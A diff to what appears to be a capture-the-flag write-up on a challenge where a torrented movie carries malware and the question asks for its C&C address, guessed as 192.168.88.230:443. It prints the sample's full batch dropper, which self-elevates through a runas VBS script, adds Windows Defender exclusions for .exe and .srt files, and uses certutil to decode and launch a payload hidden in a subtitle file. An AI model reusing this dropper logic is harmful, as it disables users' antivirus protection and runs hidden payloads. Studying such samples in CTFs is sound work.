@@ -173,11 +173,89 @@ And the flag was found by following this link: http://env263.target03/admin/scri
 ```md
 DESCRIPTION
 A friend asks for help with recent movie that was downloaded from torrents: something is wrong with player.
-The video is available at <https://static.ctftech.io/challs/Horror_stories_2k21-720p.zip>
+The video is available at https://static.ctftech.io/challs/Horror_stories_2k21-720p.zip
 QUESTION
 What is the address of C&C of the malware?
 The answer is expected in usual format for an Internet address - <IP>:<PORT>
 ```
+
+We though this was easy. And... it took a few hours. The solution
+was a lucky guess based on the C&C (Command & Control) settings.
+
+The bat script contained some magic, but nothing revealing was there.
+But we used the certutil command to get to the solution
+
+```bat
+ @echo off
+ CLS
+ :init
+ setlocal DisableDelayedExpansion
+ set cmdInvoke=1
+ set winSysFolder=System32
+ set "batchPath=%~0"
+ for %%k in (%0) do set batchName=%%~nk
+ set "vbsGetPrivileges=%temp%\OEgetPriv_%batchName%.vbs"
+ setlocal EnableDelayedExpansion
+:checkPrivileges
+  NET FILE 1>NUL 2>NUL
+  if '%errorlevel%' == '0' ( goto gotPrivileges ) else ( goto getPrivileges )
+
+:getPrivileges
+  if '%1'=='ELEV' (echo ELEV & shift /1 & goto gotPrivileges)
+  
+  ECHO Set UAC = CreateObject^("Shell.Application"^) > "%vbsGetPrivileges%"
+  ECHO args = "ELEV " >> "%vbsGetPrivileges%"
+  ECHO For Each strArg in WScript.Arguments >> "%vbsGetPrivileges%"
+  ECHO args = args ^& strArg ^& " "  >> "%vbsGetPrivileges%"
+  ECHO Next >> "%vbsGetPrivileges%"
+
+  if '%cmdInvoke%'=='1' goto InvokeCmd 
+
+  ECHO UAC.ShellExecute "!batchPath!", args, "", "runas", 1 >> "%vbsGetPrivileges%"
+  goto ExecElevation
+
+:InvokeCmd
+  ECHO args = "/c """ + "!batchPath!" + """ " + args >> "%vbsGetPrivileges%"
+  ECHO UAC.ShellExecute "%SystemRoot%\%winSysFolder%\cmd.exe", args, "", "runas", 1 >> "%vbsGetPrivileges%"
+
+:ExecElevation
+ "%SystemRoot%\%winSysFolder%\WScript.exe" "%vbsGetPrivileges%" %*
+ exit /B
+
+:gotPrivileges
+ setlocal & cd /d %~dp0
+ if '%1'=='ELEV' (del "%vbsGetPrivileges%" 1>nul 2>nul  &  shift /1)
+
+ powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionExt "exe"
+ powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionExt "srt"
+
+ certutil -decodehex -f Subtitles.srt Subtitles_tmp.srt
+
+ start Subtitles_tmp.srt
+ cmd /k
+ exit
+```
+
+We have this now, how do we run it?
+
+```bat
+certutil -decodehex -f Subtitles.srt Subtitles_tmp.srt
+```
+
+Obviously windows, but we're on Kali, so `wine` it is. To open a windows terminal in Kali, run `wine cmd`, this will enter a command promt, where it's possible to navigate to the local Kali files.
+
+But, nothing interesting there that couldn't have been found in the `.msi` file.
+
+We tried a bunch of lucky guesses, but got a small mistake in the IP.
+
+Grepping the file again
+
+![Grep contents](../../images/grep-results.png){: .image-process-crisp}
+
+So the IP is 192.168.88.230, and if it's an encrypted communication channel, the the best guess for the port would be 443, that's if using HTTPS.
+
+The guess was correct! The answer `192.168.88.230:443`.
+
 
 #### STUCK
 
